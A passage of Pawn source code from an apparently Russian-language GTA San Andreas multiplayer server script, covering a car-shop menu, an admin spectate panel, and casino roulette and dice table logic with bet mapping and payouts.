	if(booston == 0) format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~%i ~y~COLOR2: ~w~%i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1],GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
	else if(booston == 1) format(string,128,"~n~~n~~n~~n~~n~~n~~n~~n~~b~NAME: ~w~%s~n~~g~COST: ~w~%i~n~~y~COLOR1: ~w~%i ~y~COLOR2: ~w~%i",VehicleNames[ShopCar[GetPVarInt(playerid, "SelectAvto")][0]-400],ShopCar[GetPVarInt(playerid, "SelectAvto")][1]-ShopCar[GetPVarInt(playerid, "SelectAvto")][1]*20/100,GetPVarInt(playerid,"BuyColor"),GetPVarInt(playerid,"BuyColor1"));
	GameTextForPlayer(playerid,string, 5000, 3);
	return 1;
}
stock ShowBuyCar(playerid)
{
	SetPVarInt(playerid, "SelectAvto", 0);
	switch(GetPVarInt(playerid,"CarShop"))
	{
	case 0: SetPVarInt(playerid, "SelectAvto", 0);//nope
	case 1: SetPVarInt(playerid, "SelectAvto", 20);//c
	case 2: SetPVarInt(playerid, "SelectAvto", 39);//d
	case 3: SetPVarInt(playerid, "SelectAvto", 72);//a
	case 4: SetPVarInt(playerid, "SelectAvto", 57);//b
	}
	PlayerTextDrawShow(playerid, ShopText[playerid]);
	for(new x; x < 12; x++) TextDrawShowForPlayer(playerid, AutoShopText[x]);
	SetPlayerVirtualWorld(playerid,playerid+1);
	SelectTextDraw(playerid, 0x0080FFFF);
	AutoSaloon[playerid] = true;
	return ShowingCar(playerid);
}
stock ExitCar(playerid)
{
	for(new x; x < 12; x++) TextDrawHideForPlayer(playerid, AutoShopText[x]);
	PlayerTextDrawHide(playerid, ShopText[playerid]);
	if(PlayerInfo[playerid][SalonCar] != INVALID_VEHICLE_ID) DestroyVehicle(PlayerInfo[playerid][SalonCar]);
	PlayerInfo[playerid][SalonCar] = INVALID_VEHICLE_ID;
	SetPVarInt(playerid,"SelectAvto",-1);
	CancelSelectTextDraw(playerid);
	if(GetPVarInt(playerid,"AutoShop") != 0)
	{
		switch(GetPVarInt(playerid,"AutoShop"))
		{
		case 1: return SetPosAutos(playerid,556.5716,-1292.6392,17.2482,0,0,0);
		case 2: return SetPosAutos(playerid,-1951.2544,293.6375,35.4688,0,0,0);
		case 3: return SetPosAutos(playerid,-1657.7015,1210.2267,7.2500,0,0,0);
		case 4: return SetPosAutos(playerid, 2200.8857,1394.2892,11.0625,0,0,0);
		}
	}
	DeletePVar(playerid,"AutoShop");
	DeletePVar(playerid,"CarShop");
	DeletePVar(playerid,"Nokick");
	AutoSaloon[playerid] = false;
	return true;
}

stock SetPosAutos(playerid,Float:x,Float:y,Float:z,Float:angle,Interiorid,worldid)
{
	SetPlayerPos(playerid,x,y,z);
	SetPlayerInterior(playerid,Interiorid);
	SetPlayerVirtualWorld(playerid,worldid);
	SetPlayerFacingAngle(playerid,angle);
	SetCameraBehindPlayer(playerid);
	return 1;
}
stock GetNearestVehicleAll(playerid)
{
	for(new i=0; i<MAX_VEHICLES; i++)
	{
		new Float:X,Float:Y,Float:Z;
		GetVehiclePos(i,X,Y,Z);
		if(PlayerToPoint(4.0, playerid, X, Y, Z))return i;
	}
	return -1;
}
stock MotoCikl(vehicleid)
{
	new result;
	new model = GetVehicleModel(vehicleid);
	switch(model)
	{
	case 581, 522, 461, 521, 523, 463, 586, 468, 471: result = model;
	default: result = 0;
	}
	return result;
}
publics: ReklamaTimer()
{
	SendClientMessageToAll(0x8bb717aa," ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	SendClientMessageToAll(0x2cc72caa," Задайте ваш вопрос в поддержку сервера - /question");
	SendClientMessageToAll(0x2cc72caa," Всю интересующую вас информацию вы можете получить на сайте");
	SendClientMessageToAll(0x8bb717aa," ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
}

stock DisableEnableReconButton(playerid, button, enable, show = 1)
{
	PlayerTextDrawHide(playerid, ReconPlayer[button]);

	if(!enable) PlayerTextDrawBoxColor(playerid,ReconPlayer[button], 0x00000055);
	else PlayerTextDrawBoxColor(playerid,ReconPlayer[button], 0xD97700AA);

	if(show) PlayerTextDrawShow(playerid, ReconPlayer[button]);
	return 1;
}
forward SpecPlayers(playerid);
public SpecPlayers(playerid)
{
	StartSpectate(playerid, SpecAd[playerid]);
}
stock StartSpectate(playerid, specid)
{
	new httpquery[150], spName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, spName, sizeof(spName));
	DisallowSpawn[playerid] = 1;
	format(httpquery, sizeof(httpquery), "%s~n~ID: %i", spName, specid);
	PlayerTextDrawSetString(playerid, ReconPlayer[6],httpquery);
	if(IsPlayerInAnyVehicle(specid))
	{
		SetPlayerInterior(playerid,GetPlayerInterior(specid));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(specid));
		ac_TogglePlayerSpectating(playerid, 1);
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specid));
	}
	else
	{
		SetPlayerInterior(playerid,GetPlayerInterior(specid));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(specid));
		ac_TogglePlayerSpectating(playerid, 1);
		PlayerSpectatePlayer(playerid, specid);
	}
	return true;
}
stock StopSpectate(playerid)
{
	if(!Spectate[playerid]) return true;
	DisallowSpawn[playerid] = 0;
	if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
	SpecAd[playerid] = 65535;
	PlayerTextDrawHide(playerid, ReconPlayer[34]);
	ac_TogglePlayerSpectating(playerid, 0);

	for(new i = 0; i < sizeof(ReconPlayer); i++)
	PlayerTextDrawHide(playerid, ReconPlayer[i]);

	for(new i = 7; i < sizeof(ReconPlayer); i++)
	DisableEnableReconButton(playerid, i, 0, 0);

	CancelSelectTextDraw(playerid);
	PlayerTextDrawSetString(playerid, ReconPlayer[5],"");
	PlayerTextDrawSetString(playerid, ReconPlayer[6],"");
	return true;
}
stock SubTextDelete(playerid)
{
	for(new i = 16; i < 35; i++)
	PlayerTextDrawHide(playerid, ReconPlayer[i]),DisableEnableReconButton(playerid, i, 0, 0);

	ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

	DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
	return 1;
}
/*publics: OnPlayerInteriorChange(playerid)
{
	if(Spectate[SpecID[playerid]] == 1 && SpecAd[SpecID[playerid]] == playerid && SpecID[playerid] != INVALID_PLAYER_ID) StartSpectate(SpecID[playerid],playerid);
	return 1;
}*/

stock CreateReconButtonn(playerid, Float:Xpos, Float:Ypos, button_text[], txtInit)
{
	ReconPlayer[txtInit] = CreatePlayerTextDraw(playerid,Xpos, Ypos, button_text);
	PlayerTextDrawBackgroundColor(playerid,ReconPlayer[txtInit], 0x000000AA);
	PlayerTextDrawFont(playerid,ReconPlayer[txtInit], 1);
	PlayerTextDrawLetterSize(playerid,ReconPlayer[txtInit], 0.200, 1.100);
	PlayerTextDrawColor(playerid,ReconPlayer[txtInit], 0xAAAAAAAA);
	PlayerTextDrawSetOutline(playerid,ReconPlayer[txtInit], 0);
	PlayerTextDrawAlignment(playerid,ReconPlayer[txtInit], 2);
	PlayerTextDrawSetProportional(playerid,ReconPlayer[txtInit], 1);
	PlayerTextDrawSetShadow(playerid,ReconPlayer[txtInit], 0);
	PlayerTextDrawUseBox(playerid,ReconPlayer[txtInit], 1);
	PlayerTextDrawBoxColor(playerid,ReconPlayer[txtInit], 0x00000055);
	PlayerTextDrawTextSize(playerid,ReconPlayer[txtInit], 11.000, 60.000);
	PlayerTextDrawSetSelectable(playerid, ReconPlayer[txtInit], 1);
	return 1;
}

stock GetNumberThisIP(test_ip[])
{
	new against_ip[32+1]; new ip_count = 0;
	foreach(x)
	{
		GetPlayerIp(x,against_ip,32);
		if(!strcmp(against_ip,test_ip))
		{
			ip_count++;
		}
	}
	return ip_count;
}
stock GetCasinoNumber(playerid)
{
	switch(GetPVarInt(playerid,"RNumber"))
	{
	case 0: SetPVarString(playerid,"RNumbers","0"), SetPVarInt(playerid,"RNumber_",1);
	case 1: SetPVarString(playerid,"RNumbers","1"), SetPVarInt(playerid,"RNumber_",1);
	case 3: SetPVarString(playerid,"RNumbers","2"), SetPVarInt(playerid,"RNumber_",1);
	case 5: SetPVarString(playerid,"RNumbers","3"), SetPVarInt(playerid,"RNumber_",1);
	case 11: SetPVarString(playerid,"RNumbers","4"), SetPVarInt(playerid,"RNumber_",1);
	case 13: SetPVarString(playerid,"RNumbers","5"), SetPVarInt(playerid,"RNumber_",1);
	case 15: SetPVarString(playerid,"RNumbers","6"), SetPVarInt(playerid,"RNumber_",1);
	case 21: SetPVarString(playerid,"RNumbers","7"), SetPVarInt(playerid,"RNumber_",1);
	case 23: SetPVarString(playerid,"RNumbers","8"), SetPVarInt(playerid,"RNumber_",1);
	case 25: SetPVarString(playerid,"RNumbers","9"), SetPVarInt(playerid,"RNumber_",1);
	case 31: SetPVarString(playerid,"RNumbers","10"), SetPVarInt(playerid,"RNumber_",1);
	case 33: SetPVarString(playerid,"RNumbers","11"), SetPVarInt(playerid,"RNumber_",1);
	case 35: SetPVarString(playerid,"RNumbers","12"), SetPVarInt(playerid,"RNumber_",1);
	case 41: SetPVarString(playerid,"RNumbers","13"), SetPVarInt(playerid,"RNumber_",1);
	case 43: SetPVarString(playerid,"RNumbers","14"), SetPVarInt(playerid,"RNumber_",1);
	case 45: SetPVarString(playerid,"RNumbers","15"), SetPVarInt(playerid,"RNumber_",1);
	case 51: SetPVarString(playerid,"RNumbers","16"), SetPVarInt(playerid,"RNumber_",1);
	case 53: SetPVarString(playerid,"RNumbers","17"), SetPVarInt(playerid,"RNumber_",1);
	case 55: SetPVarString(playerid,"RNumbers","18"), SetPVarInt(playerid,"RNumber_",1);
	case 61: SetPVarString(playerid,"RNumbers","19"), SetPVarInt(playerid,"RNumber_",1);
	case 63: SetPVarString(playerid,"RNumbers","20"), SetPVarInt(playerid,"RNumber_",1);
	case 65: SetPVarString(playerid,"RNumbers","21"), SetPVarInt(playerid,"RNumber_",1);
	case 71: SetPVarString(playerid,"RNumbers","22"), SetPVarInt(playerid,"RNumber_",1);
	case 73: SetPVarString(playerid,"RNumbers","23"), SetPVarInt(playerid,"RNumber_",1);
	case 75: SetPVarString(playerid,"RNumbers","24"), SetPVarInt(playerid,"RNumber_",1);
	case 81: SetPVarString(playerid,"RNumbers","25"), SetPVarInt(playerid,"RNumber_",1);
	case 83: SetPVarString(playerid,"RNumbers","26"), SetPVarInt(playerid,"RNumber_",1);
	case 85: SetPVarString(playerid,"RNumbers","27"), SetPVarInt(playerid,"RNumber_",1);
	case 91: SetPVarString(playerid,"RNumbers","28"), SetPVarInt(playerid,"RNumber_",1);
	case 93: SetPVarString(playerid,"RNumbers","29"), SetPVarInt(playerid,"RNumber_",1);
	case 95: SetPVarString(playerid,"RNumbers","30"), SetPVarInt(playerid,"RNumber_",1);
	case 101: SetPVarString(playerid,"RNumbers","31"), SetPVarInt(playerid,"RNumber_",1);
	case 103: SetPVarString(playerid,"RNumbers","32"), SetPVarInt(playerid,"RNumber_",1);
	case 105: SetPVarString(playerid,"RNumbers","33"), SetPVarInt(playerid,"RNumber_",1);
	case 111: SetPVarString(playerid,"RNumbers","34"), SetPVarInt(playerid,"RNumber_",1);
	case 113: SetPVarString(playerid,"RNumbers","35"), SetPVarInt(playerid,"RNumber_",1);
	case 115: SetPVarString(playerid,"RNumbers","36"), SetPVarInt(playerid,"RNumber_",1);
	case 2: SetPVarString(playerid,"RNumbers","1, 2"), SetPVarInt(playerid,"RNumber_",2);
	case 4: SetPVarString(playerid,"RNumbers","2, 3"), SetPVarInt(playerid,"RNumber_",2);
	case 6: SetPVarString(playerid,"RNumbers","1, 4"), SetPVarInt(playerid,"RNumber_",2);
	case 7: SetPVarString(playerid,"RNumbers","1, 2, 4, 5"), SetPVarInt(playerid,"RNumber_",4);
	case 8: SetPVarString(playerid,"RNumbers","2, 5"), SetPVarInt(playerid,"RNumber_",2);
	case 9: SetPVarString(playerid,"RNumbers","2, 3, 5, 6"), SetPVarInt(playerid,"RNumber_",4);
	case 10: SetPVarString(playerid,"RNumbers","3, 6"), SetPVarInt(playerid,"RNumber_",2);
	case 12: SetPVarString(playerid,"RNumbers","4, 5"), SetPVarInt(playerid,"RNumber_",2);
	case 14: SetPVarString(playerid,"RNumbers","5, 6"), SetPVarInt(playerid,"RNumber_",2);
	case 16: SetPVarString(playerid,"RNumbers","4, 7"), SetPVarInt(playerid,"RNumber_",2);
	case 17: SetPVarString(playerid,"RNumbers","4, 5, 7, 8"), SetPVarInt(playerid,"RNumber_",4);
	case 18: SetPVarString(playerid,"RNumbers","5, 8"), SetPVarInt(playerid,"RNumber_",2);
	case 19: SetPVarString(playerid,"RNumbers","5, 6, 8, 9"), SetPVarInt(playerid,"RNumber_",4);
	case 20: SetPVarString(playerid,"RNumbers","6, 9"), SetPVarInt(playerid,"RNumber_",2);
	case 22: SetPVarString(playerid,"RNumbers","7, 8"), SetPVarInt(playerid,"RNumber_",2);
	case 24: SetPVarString(playerid,"RNumbers","8, 9"), SetPVarInt(playerid,"RNumber_",2);
	case 26: SetPVarString(playerid,"RNumbers","7, 10"), SetPVarInt(playerid,"RNumber_",2);
	case 27: SetPVarString(playerid,"RNumbers","7, 8, 10, 11"), SetPVarInt(playerid,"RNumber_",4);
	case 28: SetPVarString(playerid,"RNumbers","8, 10"), SetPVarInt(playerid,"RNumber_",2);
	case 29: SetPVarString(playerid,"RNumbers","8, 9, 11, 12"), SetPVarInt(playerid,"RNumber_",4);
	case 30: SetPVarString(playerid,"RNumbers","9, 12"), SetPVarInt(playerid,"RNumber_",2);
	case 32: SetPVarString(playerid,"RNumbers","10, 11"), SetPVarInt(playerid,"RNumber_",2);
	case 34: SetPVarString(playerid,"RNumbers","11, 12"), SetPVarInt(playerid,"RNumber_",2);
	case 36: SetPVarString(playerid,"RNumbers","10, 13"), SetPVarInt(playerid,"RNumber_",2);
	case 37: SetPVarString(playerid,"RNumbers","10, 11, 13, 14"), SetPVarInt(playerid,"RNumber_",4);
	case 38: SetPVarString(playerid,"RNumbers","11, 14"), SetPVarInt(playerid,"RNumber_",2);
	case 39: SetPVarString(playerid,"RNumbers","11, 12, 14, 15"), SetPVarInt(playerid,"RNumber_",4);
	case 40: SetPVarString(playerid,"RNumbers","12, 15"), SetPVarInt(playerid,"RNumber_",2);
	case 42: SetPVarString(playerid,"RNumbers","13, 14"), SetPVarInt(playerid,"RNumber_",2);
	case 44: SetPVarString(playerid,"RNumbers","14, 15"), SetPVarInt(playerid,"RNumber_",2);
	case 46: SetPVarString(playerid,"RNumbers","13, 16"), SetPVarInt(playerid,"RNumber_",2);
	case 47: SetPVarString(playerid,"RNumbers","13, 14, 16, 17"), SetPVarInt(playerid,"RNumber_",4);
	case 48: SetPVarString(playerid,"RNumbers","14, 17"), SetPVarInt(playerid,"RNumber_",2);
	case 49: SetPVarString(playerid,"RNumbers","14, 15, 17, 18"), SetPVarInt(playerid,"RNumber_",4);
	case 50: SetPVarString(playerid,"RNumbers","15, 18"), SetPVarInt(playerid,"RNumber_",2);
	case 52: SetPVarString(playerid,"RNumbers","16, 17"), SetPVarInt(playerid,"RNumber_",2);
	case 54: SetPVarString(playerid,"RNumbers","17, 18"), SetPVarInt(playerid,"RNumber_",2);
	case 56: SetPVarString(playerid,"RNumbers","16, 19"), SetPVarInt(playerid,"RNumber_",2);
	case 57: SetPVarString(playerid,"RNumbers","16, 17, 19, 20"), SetPVarInt(playerid,"RNumber_",4);
	case 58: SetPVarString(playerid,"RNumbers","17, 20"), SetPVarInt(playerid,"RNumber_",2);
	case 59: SetPVarString(playerid,"RNumbers","17, 18, 20, 21"), SetPVarInt(playerid,"RNumber_",4);
	case 60: SetPVarString(playerid,"RNumbers","18, 21"), SetPVarInt(playerid,"RNumber_",2);
	case 62: SetPVarString(playerid,"RNumbers","19, 20"), SetPVarInt(playerid,"RNumber_",2);
	case 64: SetPVarString(playerid,"RNumbers","20, 21"), SetPVarInt(playerid,"RNumber_",2);
	case 66: SetPVarString(playerid,"RNumbers","19, 22"), SetPVarInt(playerid,"RNumber_",2);
	case 67: SetPVarString(playerid,"RNumbers","19, 20, 22, 23"), SetPVarInt(playerid,"RNumber_",4);
	case 68: SetPVarString(playerid,"RNumbers","20, 23"), SetPVarInt(playerid,"RNumber_",2);
	case 69: SetPVarString(playerid,"RNumbers","20, 21, 23, 24"), SetPVarInt(playerid,"RNumber_",4);
	case 70: SetPVarString(playerid,"RNumbers","21, 24"), SetPVarInt(playerid,"RNumber_",2);
	case 72: SetPVarString(playerid,"RNumbers","22, 23"), SetPVarInt(playerid,"RNumber_",2);
	case 74: SetPVarString(playerid,"RNumbers","23, 24"), SetPVarInt(playerid,"RNumber_",2);
	case 76: SetPVarString(playerid,"RNumbers","22, 25"), SetPVarInt(playerid,"RNumber_",2);
	case 77: SetPVarString(playerid,"RNumbers","22, 23, 25, 26"), SetPVarInt(playerid,"RNumber_",4);
	case 78: SetPVarString(playerid,"RNumbers","23, 26"), SetPVarInt(playerid,"RNumber_",2);
	case 79: SetPVarString(playerid,"RNumbers","23, 24, 26, 27"), SetPVarInt(playerid,"RNumber_",4);
	case 80: SetPVarString(playerid,"RNumbers","24, 27"), SetPVarInt(playerid,"RNumber_",2);
	case 82: SetPVarString(playerid,"RNumbers","25, 26"), SetPVarInt(playerid,"RNumber_",2);
	case 84: SetPVarString(playerid,"RNumbers","26, 27"), SetPVarInt(playerid,"RNumber_",2);
	case 86: SetPVarString(playerid,"RNumbers","25, 28"), SetPVarInt(playerid,"RNumber_",2);
	case 87: SetPVarString(playerid,"RNumbers","25, 26, 28, 29"), SetPVarInt(playerid,"RNumber_",4);
	case 88: SetPVarString(playerid,"RNumbers","26, 29"), SetPVarInt(playerid,"RNumber_",2);
	case 89: SetPVarString(playerid,"RNumbers","26, 27, 29, 30"), SetPVarInt(playerid,"RNumber_",4);
	case 90: SetPVarString(playerid,"RNumbers","27, 30"), SetPVarInt(playerid,"RNumber_",2);
	case 92: SetPVarString(playerid,"RNumbers","28, 29"), SetPVarInt(playerid,"RNumber_",2);
	case 94: SetPVarString(playerid,"RNumbers","29, 30"), SetPVarInt(playerid,"RNumber_",2);
	case 96: SetPVarString(playerid,"RNumbers","28, 31"), SetPVarInt(playerid,"RNumber_",2);
	case 97: SetPVarString(playerid,"RNumbers","28, 29, 31, 32"), SetPVarInt(playerid,"RNumber_",4);
	case 98: SetPVarString(playerid,"RNumbers","29, 32"), SetPVarInt(playerid,"RNumber_",2);
	case 99: SetPVarString(playerid,"RNumbers","29, 30, 32, 33"), SetPVarInt(playerid,"RNumber_",4);
	case 100: SetPVarString(playerid,"RNumbers","30, 33"), SetPVarInt(playerid,"RNumber_",2);
	case 102: SetPVarString(playerid,"RNumbers","31, 32"), SetPVarInt(playerid,"RNumber_",2);
	case 104: SetPVarString(playerid,"RNumbers","32, 33"), SetPVarInt(playerid,"RNumber_",2);
	case 106: SetPVarString(playerid,"RNumbers","31, 34"), SetPVarInt(playerid,"RNumber_",2);
	case 107: SetPVarString(playerid,"RNumbers","31, 32, 34, 35"), SetPVarInt(playerid,"RNumber_",4);
	case 108: SetPVarString(playerid,"RNumbers","32, 35"), SetPVarInt(playerid,"RNumber_",2);
	case 109: SetPVarString(playerid,"RNumbers","32, 33, 35, 36"), SetPVarInt(playerid,"RNumber_",4);
	case 110: SetPVarString(playerid,"RNumbers","33, 36"), SetPVarInt(playerid,"RNumber_",2);
	case 112: SetPVarString(playerid,"RNumbers","34, 35"), SetPVarInt(playerid,"RNumber_",2);
	case 114: SetPVarString(playerid,"RNumbers","35, 36"), SetPVarInt(playerid,"RNumber_",2);
	case 116: SetPVarString(playerid,"RNumbers","1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34"), SetPVarInt(playerid,"RNumber_",12);
	case 118: SetPVarString(playerid,"RNumbers","2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35"), SetPVarInt(playerid,"RNumber_",12);
	case 120: SetPVarString(playerid,"RNumbers","3, 6, 9, 12, 15, 18, 21, 24, 27, 30, 33, 36"), SetPVarInt(playerid,"RNumber_",12);
	case 121: SetPVarString(playerid,"RNumbers","1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12"), SetPVarInt(playerid,"RNumber_",12);
	case 122: SetPVarString(playerid,"RNumbers","13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24"), SetPVarInt(playerid,"RNumber_",12);
	case 123: SetPVarString(playerid,"RNumbers","25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36"), SetPVarInt(playerid,"RNumber_",12);
	case 124: SetPVarString(playerid,"RNumbers","1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18"), SetPVarInt(playerid,"RNumber_",18);
	case 125: SetPVarString(playerid,"RNumbers","2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36"), SetPVarInt(playerid,"RNumber_",18);
	case 126: SetPVarString(playerid,"RNumbers","1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36"), SetPVarInt(playerid,"RNumber_",18);
	case 127: SetPVarString(playerid,"RNumbers","2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35"), SetPVarInt(playerid,"RNumber_",18);
	case 128: SetPVarString(playerid,"RNumbers","1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35"), SetPVarInt(playerid,"RNumber_",18);
	case 129: SetPVarString(playerid,"RNumbers","19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36"), SetPVarInt(playerid,"RNumber_",18);
	}
	return true;
}
publics: RouletCheck(idx)
{
	new strings[50];
	if(RouletPlay[idx])
	{
		if(RouletTimer[idx][0x1] < RouletTimer[idx][0x2])
		{
			RouletTimer[idx][0x1]++;
			RouletNumber[idx] = random(37);
			foreach(i)
			{
				if(GetPVarInt(i,"RStol") != idx && RouletKrupie[idx] != i) continue;
				switch(RouletNumber[idx])
				{
				case 0: format(strings, 20, "~g~%i", RouletNumber[idx]);
				case 1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36: format(strings, 20, "~r~%i", RouletNumber[idx]);
				default: format(strings, 20, "%i", RouletNumber[idx]);
				}
				GameTextForPlayer(i, strings, 4000, 6);
			}
		}
		else RouletPlay[idx] = false, RouletTimer[idx][0x1] = 0, RouletTimer[idx][0x2] = 0, RouletPrize[idx] = true;
	}
	foreach(i)
	{
		if(!RouletPrize[idx]) continue;
		if(GetPVarInt(i,"RStol") == idx || RouletKrupie[idx] == i)
		{
			if(!GetPVarInt(i,"RStavka") || RouletKrupie[idx] == i) SendMes(i,COLOR_YELLOW, " Выпало число %i.",RouletNumber[idx]);
			else if(GetPVarInt(i,"RStavka"))
			{
				new str[300], number[20], bool:null, null_;
				GetPVarString(i,"RNumbers",str,sizeof(str));
				sscanf(str,"p<,>a<i>[20]",number);
				null = false;
				for(new n = 0; n < GetPVarInt(i,"RNumber_"); n++) if(number[n] == RouletNumber[idx]) { null = true; break; }
				if(null == false) SendMes(i,COLOR_YELLOW," Выпало число %i. Ваша ставка проиграла!",RouletNumber[idx]), SetPlayerChatBubble(i,"Проиграл",COLOR_LIGHTRED,30.0,3000);
				else
				{
					switch(GetPVarInt(i,"RNumber_")) { case 1: null_ = 36; case 2: null_ = 8; case 4: null_ = 6; case 12: null_ = 3; case 18: null_ = 2; }
					SendMes(i,COLOR_YELLOW," Выпало число %i. Вы выиграли %i вирт!",RouletNumber[idx], GetPVarInt(i,"RStavka")*null_);
					PlayerInfo[i][pCash]+=GetPVarInt(i,"RStavka")*null_;
					SetPlayerChatBubble(i,"Выйграл",COLOR_LIGHTGREEN,30.0,3000);
				}
			}
		}
	}
	if(RouletPrize[idx])
	{
		RouletPrize[idx] = false;
		RouletPlay[idx] = false;
		RouletNumber[idx] = 0;
		KillTimer(RouletTimer[idx][0x0]);
		foreach(l)
		{
			if(!IsPlayerConnected(l) || IsPlayerNPC(l)) continue;
			if(GetPVarInt(l,"RStol") != idx || !GetPVarInt(l,"RStavka")) continue;
			switch(idx)
			{
			case 1..4:
				{
					if(CasinoInfo[1][caMafia] == 6) MafiaBank[0][nYakuza]+= GetPVarInt(l,"RStavka")/97;
					else if(CasinoInfo[1][caMafia] == 14) MafiaBank[0][nRm]+= GetPVarInt(l,"RStavka")/97;
					else if(CasinoInfo[1][caMafia] == 5) MafiaBank[0][nLcn]+= GetPVarInt(l,"RStavka")/97;
				}
			default:
				{
					if(CasinoInfo[2][caMafia] == 6) MafiaBank[0][nYakuza]+= GetPVarInt(l,"RStavka")/97;
					else if(CasinoInfo[2][caMafia] == 14) MafiaBank[0][nRm]+= GetPVarInt(l,"RStavka")/97;
					else if(CasinoInfo[2][caMafia] == 5) MafiaBank[0][nLcn]+= GetPVarInt(l,"RStavka")/97;
				}
			}
			PlayerInfo[RouletKrupie[idx]][pPayCheck]+=100;
			DestroyObject(GetPVarInt(l,"RObj"));
			new obj = CreateObject(random(5) + 1912,GetPVarFloat(l,"RXONE"),GetPVarFloat(l,"RYONE"),GetPVarFloat(l,"RZONE"),0.00,0.00,0.00);
			SetPVarFloat(l,"RX",GetPVarFloat(l,"RXONE"));
			SetPVarFloat(l,"RY",GetPVarFloat(l,"RYONE"));
			SetPVarFloat(l,"RZ",GetPVarFloat(l,"RZONE"));
			SetPlayerCameraLookAt(l,GetPVarFloat(l,"RXONE"),GetPVarFloat(l,"RYONE"),GetPVarFloat(l,"RZONE"));
			SetPVarInt(l,"RNumber",0);
			SetPVarInt(l,"RObj",obj);
			DeletePVar(l,"RStavka");
			DeletePVar(l,"RNumbers");
			DeletePVar(l,"RNumber_");
			PlayerTextDrawSetString(l,RouletText[l],"~<~~>~~up~~down~~n~~g~Money: none~n~~y~Bet: none");
		}
		DeletePVar(RouletKrupie[idx],"Roulet");
		RouletKrupie[idx] = INVALID_PLAYER_ID;
	}
	return true;
}
stock GetRoulet(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 2, 1962.8666,1026.0941,993.3957)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1957.9739,1026.1073,993.3957)) return 2;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1958.1686,1008.0011,993.3957)) return 3;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 1962.8086,1007.9399,993.3957)) return 4;
	//
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2230.8989,1619.5001,1006.2346)) return 5;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2242.4980,1619.5001,1006.2346)) return 6;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2230.8989,1613.5001,1006.2346)) return 7;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2242.4980,1613.5001,1006.2346)) return 8;
	//
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2230.8989,1594.5001,1006.2346)) return 9;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2242.4980,1594.5001,1006.2346)) return 10;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2230.8989,1588.5001,1006.2346)) return 11;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2242.4980,1588.5001,1006.2346)) return 12;
	else return false;
}
stock GetCasino(playerid, idx)
{
	if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caManager],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caManager2],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caManager3],true) == 0) return 2;
	if(strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie2],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie3],true) == 0
			|| strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie4],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie5],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie6],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie7],true) == 0
			|| strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie8],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie9],true) == 0 || strcmp(PlayerInfo[playerid][pName],CasinoInfo[idx][caKrupie10],true) == 0) return true;
	return false;
}
stock IsPlayerNearBone(playerid)
{
	for(new i; i <sizeof(BoneCoor); i++) if(IsPlayerInRangeOfPoint(playerid, 2.0, BoneCoor[i][0],BoneCoor[i][1],BoneCoor[i][2])) return i;
	return -1;
}
stock UpdateBone(idx)
{
	new strings[200], str[256];
	foreach(i)
	{
		if(GetPVarInt(i,"BoneStol")-1 == idx)
		{
			str = "";
			format(strings,40,"Table:_%i",idx+1);
			PlayerTextDrawSetString(i,PlayerBone[i][0],strings);
